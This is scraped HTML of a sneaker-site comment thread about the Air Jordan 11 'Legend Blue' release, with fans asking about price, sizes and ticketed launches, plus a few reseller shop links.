      <p><p>You're welcome.</p><p><a href="http://www.pawn4bitcoin.com/shop/shoes-accessories/nike-air-jordan-11s-retro-legends-size-11/" target="_blank" rel="nofollow" class="external">http://www.pawn4bitcoin.com/shop/shoes-accessories/nike-air-jordan-11s-retro-legends-size-11/</a><br/></p><p><br/></p><p><br/></p><p><a href="http://www.pawn4bitcoin.com/shop/shoes-accessories/jordan-retro-11-xi-pantone-size-11/" target="_blank" rel="nofollow" class="external">http://www.pawn4bitcoin.com/shop/shoes-accessories/jordan-retro-11-xi-pantone-size-11/</a><br/></p><p><br/></p><p>Enjoy fellas</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/f8181ff6dff65dd80f959abd99fca278/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="tim234" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">tim234</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>You're welcome.</p><p><a href="http://www.pawn4bitcoin.com/shop/shoes-accessories/jordan-retro-11-xi-pantone-size-11/" target="_blank" rel="nofollow" class="external">http://www.pawn4bitcoin.com/shop/shoes-accessories/jordan-retro-11-xi-pantone-size-11/</a><br/></p><p><br/></p><p><a href="http://www.pawn4bitcoin.com/shop/shoes-accessories/nike-air-jordan-11s-retro-legends-size-11/" target="_blank" rel="nofollow" class="external">http://www.pawn4bitcoin.com/shop/shoes-accessories/nike-air-jordan-11s-retro-legends-size-11/</a><br/></p><p><br/></p><p>Enjoy people</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/15c934a995566ef0246c2f03be197333/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="biggamejamesharden13" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">biggamejamesharden13</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>WHERE CAN I GET TICKETS NOW IN NYC HELP!!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/7e4b54d241b638c855d682377bd2a1b4/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Hfluent" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Hfluent</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>can you still camp out for these?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/7e4b54d241b638c855d682377bd2a1b4/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Hfluent" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Hfluent</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>nah they 197 </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/b2e6b0d542e09d296155a40c950429c3/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Greicyhenriquez" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Greicyhenriquez</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>How much is it for size 6</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/71fc585835dec971c7902af8c072d500/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Aintyouashh" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Aintyouashh</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>How much is it for size 5</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/2824c02b02df9ff88c85619837ec47ca/50.jpg?v=1375670433" class=
    "fyre-user-avatar" alt="dracyn" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">dracyn</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Got my ticket...Let's go.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/997220b2894a21588c8eb65d1dc2f3d8/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Javonney_Dennis" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Javonney_Dennis</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>FIRE</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/ed2ea784bd6ba5c83389540282457e92/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="12538945" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">12538945</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Tomorrow</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/aa3cef32c1a71be2d0dd9f3db405c434/50.jpg?v=1416993733" class=
    "fyre-user-avatar" alt="alexisvazquez9" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">alexisvazquez9</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>when do the tickets come out for this ?</p><p><br/></p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            

        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/8565041b6c05abbdfbbb0f87b513570a/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Iam_ddejax3" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Iam_ddejax3</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>What is the retail price for gs</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/488db7a2a67e58202b6232861042e059/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="hunterhcheyenne" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">hunterhcheyenne</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Will i be able to order them online ? I dont want to camp out ....</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/68f1b36fe30d8b7925b3ff5466362b98/50.jpg?v=1418194897" class=
    "fyre-user-avatar" alt="jemxstones" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">jemxstones</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:23552949@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/416Jamz" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">416Jamz</span></a> thank you babe</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/b4337cde4671f37c85028cad08722bb3/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="tayy11" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">tayy11</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Size 6 1/2</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/5195dffd1c42140f2584826a098dcf89/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="alanbigcas" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">alanbigcas</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>sizes are available?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/b4337cde4671f37c85028cad08722bb3/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="tayy11" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">tayy11</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Were can I get this sneakers from</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            

        
            

        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/85eb3829c4d5c72422f4dde86ed719a9/50.jpg?v=1417965422" class=
    "fyre-user-avatar" alt="Veronifunk" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Veronifunk</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:7203432@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/stereochromo" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">stereochromo</span></a> jajajaja ha sido verlas y pensar en ti. Después he visto que has sido tú el que ha compartido la foto 😂🙈</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/96fb107294e239a468efbdf9b37fbbd0/50.jpg?v=1415781215" class=
    "fyre-user-avatar" alt="kickzNkush" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">kickzNkush</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>So dope. Not doin it tho RT <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a>: Legend Blue 11s got next. Grab this pair on 12/20 <a href="http://t.co/GD3lrO3Uzx" target="_blank" rel="nofollow" class="external">dlvr.it/7lYzrJ</a> <a href="http://t.co/VCDFi02i2C" target="_blank" rel="nofollow" class="external">pic.twitter.com/VCDFi02i2C</a></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/f2ee2bafecbd5b54a39352573b92bc9b/50.jpg?v=1417959523" class=
    "fyre-user-avatar" alt="sethchambers76" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">sethchambers76</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> or nah. Buy something you like, not just something that's popular.</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/72229329fdf91f5e6ab08a768554c09b/50.jpg?v=1417959425" class=
    "fyre-user-avatar" alt="theshoegawd" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">theshoegawd</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> what do you mean by "got next?"</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/728c84f016bdd0d7d3581f80b1219085/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="mhamann23" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">mhamann23</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p> These are "ok."  After I purchased the Gamma XI's last year, I was hoping the quality of these would be better. My Achilles nearly bleeds when I wear the Gamma's, digging right into my skin. It's bad when I have to wear extra thick socks, and place a band aid on prior to putting my shoes on. I hadn't worn them the first 9 months, and one day I decided to wear them to the mall with my grandson (I'm 41).  I wish I had kept them in the box as deadstock.  </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/9ac14329ee5f9e52ff294156aede2a73/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="devyobey" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">devyobey</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>First come first serve I take it.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/2824c02b02df9ff88c85619837ec47ca/50.jpg?v=1375670433" class=
    "fyre-user-avatar" alt="dracyn" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">dracyn</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69659743@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69659743/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">Aintyouashh</span></a> $150+ tax.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/657d7e20ccd57b070f73fdc687fcfd4d/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="ileanbackk" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">ileanbackk</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>You got your ticket in NY?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/033eb5d414c0e9a297c19e79c0193f5d/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Ghut51" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Ghut51</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69503858@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69503858/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">Iam_ddejax3</span></a> $150</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1032cd41115475cd5dff5de5bcd81b10/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="NikeAirJordan" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
